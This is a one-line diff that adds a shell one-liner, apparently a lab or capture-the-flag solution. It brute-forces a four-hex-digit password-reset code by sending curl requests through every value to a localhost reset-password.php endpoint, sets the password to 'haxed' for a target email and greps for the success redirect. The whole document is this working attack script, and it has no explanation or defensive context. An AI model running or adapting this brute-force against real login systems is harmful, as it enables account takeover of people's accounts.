@@ -1,0 +1,1 @@
+python3 -c 'exec("""\nfor i in range(int("ffff", 16)+1):\n l=hex(i)[2:]\n for j in range(4-len(l)):\n  l = "0"+l\n print(l)\n""")' | while read line; do curl "http://localhost:8888/reset-password.php" -i --data "new_password=haxed&email=a%2540b.com&submit=Reset&code=$line" -s; done | grep "Location: /login.php?success="
